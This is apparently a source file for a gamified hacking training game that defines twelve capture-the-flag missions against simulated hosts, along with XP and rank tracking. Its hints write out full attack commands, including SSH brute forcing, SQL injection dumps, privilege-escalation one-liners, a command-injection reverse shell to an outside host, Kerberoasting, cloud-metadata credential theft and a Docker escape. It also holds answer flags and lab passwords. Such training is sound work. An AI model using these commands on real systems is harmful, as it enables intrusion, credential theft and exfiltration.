// Missions Campaign & Progression System for ShadowNet (Operations 1 to 12)

export const MISSIONS = [
  {
    id: 1,
    code: '0x01',
    title: 'Target Reconnaissance',
    category: 'Network Recon',
    target: '192.168.1.42',
    xp: 200,
    flag: 'FLAG{recon_perimeter_mapped_42}',
    description: `Perform network reconnaissance against target 192.168.1.42 using nmap. Map perimeter attack surfaces and identify active network services.`,
    objectives: [
      { id: 'scan_host', text: 'Scan target 192.168.1.42 with nmap', done: false },
      { id: 'find_ports', text: 'Identify open ports (SSH, HTTP, MySQL)', done: false },
      { id: 'submit_flag', text: 'Capture and submit the recon flag', done: false }
    ],
    hints: [
      'Run a standard port scan using: nmap 192.168.1.42',
      'Add service version detection for detailed banners: nmap -sV 192.168.1.42',
      'Look for the FLAG{...} string generated in your scan report output.'
    ]
  },
  {
    id: 2,
    code: '0x02',
    title: 'Web Asset Discovery',
    category: 'Web Enumeration',
    target: 'http://192.168.1.42',
    xp: 250,
    flag: 'FLAG{dir_discovery_hidden_dev_88}',
    description: `The target runs an Apache web service on port 80. Enumerate unindexed directories, discover hidden configuration files, and inspect confidential developer assets.`,
    objectives: [
      { id: 'run_gobuster', text: 'Run gobuster with /usr/share/wordlists/dirb/common.txt', done: false },
      { id: 'inspect_robots', text: 'Inspect discovered endpoints with curl', done: false },
      { id: 'submit_flag', text: 'Locate and submit the directory discovery flag', done: false }
    ],
    hints: [
      'Execute: gobuster dir -u http://192.168.1.42 -w /usr/share/wordlists/dirb/common.txt',
      'Inspect interesting files found in the scan: curl http://192.168.1.42/robots.txt',
      'Check backup files like /backup_cred.txt.bak using curl for valuable recon intel.'
    ]
  },
  {
    id: 3,
    code: '0x03',
    title: 'Credential Spraying & SSH Breach',
    category: 'Authentication',
    target: '192.168.1.42:22',
    xp: 300,
    flag: 'FLAG{hydra_strike_devadmin_cracked}',
    description: `A developer backup file referenced account 'devadmin' with passwords in rockyou.txt. Deploy hydra to crack SSH authentication and establish a remote session.`,
    objectives: [
      { id: 'run_hydra', text: 'Launch hydra against ssh://192.168.1.42 for user devadmin', done: false },
      { id: 'crack_pass', text: 'Identify valid password in rockyou.txt', done: false },
      { id: 'submit_flag', text: 'Submit the brute-force flag or login via ssh', done: false }
    ],
    hints: [
      'Syntax: hydra -l devadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.42',
      'Review the results to note the cracked password (apex2026!).',
      'The flag FLAG{hydra_strike_...} is provided in the hydra success output.'
    ]
  },
  {
    id: 4,
    code: '0x04',
    title: 'SQL Injection Exploitation',
    category: 'Database Exploitation',
    target: 'http://192.168.1.42/search.php',
    xp: 350,
    flag: 'FLAG{sqli_apex_staging_dumped}',
    description: `The staging portal exposes /search.php?query= which is directly concatenated into database queries. Exploit the SQL Injection vulnerability using sqlmap to dump user hashes.`,
    objectives: [
      { id: 'run_sqlmap_dbs', text: 'Scan endpoint with sqlmap --dbs', done: false },
      { id: 'dump_tables', text: 'Dump apex_staging.users table credentials', done: false },
      { id: 'submit_flag', text: 'Extract and submit the database breach flag', done: false }
    ],
    hints: [
      'Begin by testing databases: sqlmap -u "http://192.168.1.42/search.php?query=test" --dbs',
      'To dump credentials, run: sqlmap -u "http://192.168.1.42/search.php?query=test" -D apex_staging -T users --dump',
      'The flag is revealed inside the sqlmap database extraction report.'
    ]
  },
  {
    id: 5,
    code: '0x05',
    title: 'Privilege Escalation to Root',
    category: 'Privilege Escalation',
    target: 'internal.stag-apex.corp (Root)',
    xp: 500,
    flag: 'FLAG{root_sovereign_apex_spectre}',
    description: `Connect via SSH as devadmin (or crack the admin SHA-256 hash using hashcat). Audit sudo permissions with sudo -l and escalate to root (UID 0) to capture the initial system flag.`,
    objectives: [
      { id: 'ssh_connect', text: 'Login via ssh devadmin@192.168.1.42 (password: apex2026!)', done: false },
      { id: 'check_sudo', text: 'Run sudo -l to inspect misconfigured binary permissions', done: false },
      { id: 'escalate_root', text: 'Escalate to root and read /root/root_flag.txt', done: false }
    ],
    hints: [
      'Run: ssh devadmin@192.168.1.42 and enter password: apex2026!',
      'Once in remote shell, run `sudo -l` to find the NOPASSWD binary /usr/bin/find.',
      'Exploit find: `sudo find . -exec /bin/sh \\; -quit` or run `sudo su` then `cat /root/root_flag.txt`!'
    ]
  },
  {
    id: 6,
    code: '0x06',
    title: 'JWT Forgery & Broken Object Auth',
    category: 'API Security',
    target: 'http://192.168.1.42/api/v1/auth',
    xp: 400,
    flag: 'FLAG{jwt_alg_none_admin_bypass_77}',
    description: `The web server exposes an internal API authenticated via JSON Web Tokens. Query /api/v1/auth to obtain a token, tamper with the signature using 'alg: none' or crack the weak HMAC key with jwt-tool, and forge an admin token to query /api/v1/admin/debug.`,
    objectives: [
      { id: 'get_jwt', text: 'Retrieve JWT token from /api/v1/auth using curl', done: false },
      { id: 'forge_jwt', text: 'Forge superadmin token using jwt-tool or base64', done: false },
      { id: 'query_debug', text: 'Access /api/v1/admin/debug with forged Bearer token', done: false }
    ],
    hints: [
      'Request token: curl http://192.168.1.42/api/v1/auth',
      'Inspect or tamper with token: jwt-tool -X a (alg: none bypass) or jwt-tool -C -d secret123',
      'Query the debug endpoint: curl -H "Authorization: Bearer <forged_token>" http://192.168.1.42/api/v1/admin/debug'
    ]
  },
  {
    id: 7,
    code: '0x07',
    title: 'Command Injection & Reverse Shell',
    category: 'Remote Code Execution',
    target: 'http://192.168.1.42/api/v1/admin/ping',
    xp: 500,
    flag: 'FLAG{rce_ifs_filter_bypass_shell_99}',
    description: `The internal network diagnostic API /api/v1/admin/ping?ip= executes ping commands on the host but filters spaces and semicolons. Bypass the filter using \${IFS} or newline injection and establish an interactive reverse shell to nc -lvnp 4444.`,
    objectives: [
      { id: 'start_listener', text: 'Start Netcat listener: nc -lvnp 4444', done: false },
      { id: 'trigger_rce', text: 'Bypass filters with ${IFS} on /api/v1/admin/ping', done: false },
      { id: 'catch_shell', text: 'Catch reverse shell connection and read flag', done: false }
    ],
    hints: [
      'In a terminal window or background, run listener: nc -lvnp 4444',
      'Notice spaces are blocked. Use Linux Internal Field Separator: ${IFS}',
      'Execute: curl "http://192.168.1.42/api/v1/admin/ping?ip=127.0.0.1%0Abash\${IFS}-c\${IFS}\\"bash\${IFS}-i>&/dev/tcp/10.13.37.89/4444\${IFS}0>&1\\""'
    ]
  },
  {
    id: 8,
    code: '0x08',
    title: 'Network Pivoting & SOCKS Tunneling',
    category: 'Lateral Movement',
    target: 'Internal Subnet 10.0.0.0/24 (Vault)',
    xp: 600,
    flag: 'FLAG{pivot_socks_tunnel_vault_discovered}',
    description: `The compromised staging host contains a secondary network adapter (eth1: 10.0.0.5) connected to an isolated backend subnet. Establish a dynamic SOCKS proxy tunnel using chisel or ssh -D 1080 and scan the hidden Domain Vault (10.0.0.254) with proxychains.`,
    objectives: [
      { id: 'discover_iface', text: 'Discover secondary interface eth1 (10.0.0.5) via ip a', done: false },
      { id: 'spawn_tunnel', text: 'Spawn SOCKS proxy tunnel via ssh -D 1080 or chisel', done: false },
      { id: 'scan_vault', text: 'Scan 10.0.0.254 using proxychains nmap', done: false }
    ],
    hints: [
      'Run `ip a` or `netstat -tlpn` to discover internal interface eth1 (10.0.0.5).',
      'Create a dynamic SOCKS proxy: ssh -D 1080 devadmin@192.168.1.42 or chisel server/client.',
      'Scan the internal vault through your proxy: proxychains nmap -sT 10.0.0.254 to discover Kerberos and reveal the pivot flag!'
    ]
  },
  {
    id: 9,
    code: '0x09',
    title: 'Kerberoasting Active Directory',
    category: 'Domain Exploitation',
    target: '10.0.0.254 (Domain Controller - MSSQLSvc)',
    xp: 700,
    flag: 'FLAG{kerberoast_spn_mssql_ticket_cracked}',
    description: `The internal domain controller advertises a registered Service Principal Name (SPN) for MSSQLSvc/db01.stag-apex.corp. Request the Kerberos TGS ticket using impacket-GetUserSPNs and crack it offline with hashcat mode 13100.`,
    objectives: [
      { id: 'request_spn', text: 'Extract TGS ticket using impacket-GetUserSPNs', done: false },
      { id: 'crack_ticket', text: 'Crack Kerberos ticket using hashcat -m 13100', done: false },
      { id: 'submit_flag', text: 'Submit the Kerberoasting cracked service flag', done: false }
    ],
    hints: [
      'Extract TGS: proxychains impacket-GetUserSPNs stag-apex.corp/devadmin:apex2026! -dc-ip 10.0.0.254 -request',
      'Note the captured ticket hash: $krb5tgs$23$*MSSQLSvc/db01.stag-apex.corp*...',
      'Crack the hash: hashcat -m 13100 $krb5tgs$23$*... /usr/share/wordlists/rockyou.txt to reveal password: Winter2026!'
    ]
  },
  {
    id: 10,
    code: '0x0A',
    title: 'Linux Capabilities to Sovereign Root',
    category: 'Privilege Escalation',
    target: '10.0.0.254 (Apex Domain Vault Sovereign)',
    xp: 900,
    flag: 'FLAG{apex_master_sovereign_cap_root_2026}',
    description: `Authenticate to the internal domain vault host (10.0.0.254) with service credentials. Standard sudo is disabled. Enumerate Linux capabilities using getcap, discover /usr/bin/python3.8 = cap_setuid+ep, and execute a capability exploit to achieve Master Root sovereignty!`,
    objectives: [
      { id: 'connect_vault', text: 'Connect to internal vault: ssh svc_mssql@10.0.0.254', done: false },
      { id: 'audit_caps', text: 'Enumerate capabilities with getcap -r /', done: false },
      { id: 'exploit_cap', text: 'Exploit python3 cap_setuid+ep to claim Master Sovereign Root', done: false }
    ],
    hints: [
      'Login to vault: ssh svc_mssql@10.0.0.254 (password: Winter2026!)',
      'Check capabilities: getcap -r / 2>/dev/null to identify /usr/bin/python3.8 = cap_setuid+ep',
      'Elevate to root: python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\' and read /root/apex_master_flag.txt!'
    ]
  },
  {
    id: 11,
    code: '0x0B',
    title: 'Cloud IAM & AWS Metadata SSRF',
    category: 'Cloud Security',
    target: 'http://192.168.1.42/api/v1/proxy?url=http://169.254.169.254/...',
    xp: 800,
    flag: 'FLAG{aws_imds_ssrf_cloud_breached_42}',
    description: `The staging gateway exposes an unauthenticated SSRF proxy utility at /api/v1/proxy?url=. Query the AWS Instance Metadata Service (169.254.169.254) to extract temporary IAM role credentials, authenticate with the aws CLI, and exfiltrate secrets from s3://apex-confidential-backups.`,
    objectives: [
      { id: 'query_imds', text: 'Extract IAM credentials from 169.254.169.254 via SSRF', done: false },
      { id: 'verify_sts', text: 'Verify cloud identity: aws sts get-caller-identity', done: false },
      { id: 'exfil_s3', text: 'Exfiltrate cloud flag: aws s3 cp s3://apex-confidential-backups/cloud_flag.txt .', done: false }
    ],
    hints: [
      'Extract IAM credentials: curl "http://192.168.1.42/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ApexCloudRole"',
      'Verify IAM role: aws sts get-caller-identity',
      'Enumerate and download confidential cloud bucket: aws s3 ls and aws s3 cp s3://apex-confidential-backups/cloud_flag.txt .'
    ]
  },
  {
    id: 12,
    code: '0x0C',
    title: 'Docker Socket Container Breakout',
    category: 'Container Security',
    target: 'Docker Namespace (Host Node Breakout)',
    xp: 1000,
    flag: 'FLAG{docker_sock_container_escape_host_pwned}',
    description: `You are placed inside an isolated microservice container. Detect containerization via /proc/1/cgroup, locate the mounted Docker control socket (/var/run/docker.sock), and execute a privileged container breakout to mount the physical host filesystem!`,
    objectives: [
      { id: 'detect_container', text: 'Verify container isolation via cat /proc/1/cgroup', done: false },
      { id: 'enum_socket', text: 'Locate writable /var/run/docker.sock or run docker ps', done: false },
      { id: 'escape_host', text: 'Execute docker breakout to mount host root and read flag', done: false }
    ],
    hints: [
      'Check if inside a container: cat /proc/1/cgroup (displays docker/...)',
      'Notice /var/run/docker.sock is available. Check containers: docker ps',
      'Escape by mounting the physical host root: docker run -v /:/mnt/host alpine chroot /mnt/host and cat /mnt/host/root/docker_escape_flag.txt!'
    ]
  }
];

export class MissionManager {
  constructor() {
    this.missions = MISSIONS;
    this.currentMissionIndex = 0;
    this.solvedMissions = new Set();
    this.totalXP = 0;
    this.rankTitles = [
      { minXp: 0, title: 'Script Kiddie', level: 1 },
      { minXp: 200, title: 'Recon Specialist', level: 2 },
      { minXp: 450, title: 'Network Hunter', level: 3 },
      { minXp: 750, title: 'Red Team Operative', level: 4 },
      { minXp: 1100, title: 'Elite Spectre', level: 5 },
      { minXp: 1500, title: 'API Infiltrator', level: 6 },
      { minXp: 2000, title: 'Exploit Weaponizer', level: 7 },
      { minXp: 2600, title: 'Network Ghost', level: 8 },
      { minXp: 3300, title: 'Domain Breaker', level: 9 },
      { minXp: 4200, title: 'Cyber Sovereign', level: 10 },
      { minXp: 5000, title: 'Cloud Sovereign', level: 11 },
      { minXp: 6000, title: 'Omniscient Apex Mastermind', level: 12 }
    ];
  }

  getCurrentMission() {
    return this.missions[this.currentMissionIndex];
  }

  getRank() {
    let current = this.rankTitles[0];
    for (const r of this.rankTitles) {
      if (this.totalXP >= r.minXp) {
        current = r;
      }
    }
    return current;
  }

  submitFlag(flagAttempt) {
    const cleanFlag = flagAttempt.trim();
    const curr = this.getCurrentMission();

    if (cleanFlag === curr.flag) {
      if (!this.solvedMissions.has(curr.id)) {
        this.solvedMissions.add(curr.id);
        this.totalXP += curr.xp;

        // Mark objectives done
        curr.objectives.forEach(obj => { obj.done = true; });

        const prevIndex = this.currentMissionIndex;
        if (this.currentMissionIndex < this.missions.length - 1) {
          this.currentMissionIndex++;
        }

        return {
          success: true,
          awardedXp: curr.xp,
          nextMission: this.missions[this.currentMissionIndex],
          isGameComplete: this.solvedMissions.size === this.missions.length,
          rank: this.getRank()
        };
      } else {
        return { success: false, alreadySolved: true };
      }
    }

    return { success: false, message: 'Invalid flag sequence.' };
  }

  setMissionIndex(idx) {
    if (idx >= 0 && idx < this.missions.length) {
      this.currentMissionIndex = idx;
      return true;
    }
    return false;
  }

  jumpToMission(idOrNum) {
    const targetNum = parseInt(idOrNum, 10);
    if (!isNaN(targetNum)) {
      const foundIdx = this.missions.findIndex(m => m.id === targetNum);
      if (foundIdx !== -1) {
        this.currentMissionIndex = foundIdx;
        return this.missions[foundIdx];
      }
    }
    const foundCode = this.missions.findIndex(m => m.code.toLowerCase() === idOrNum.toLowerCase());
    if (foundCode !== -1) {
      this.currentMissionIndex = foundCode;
      return this.missions[foundCode];
    }
    return null;
  }
}
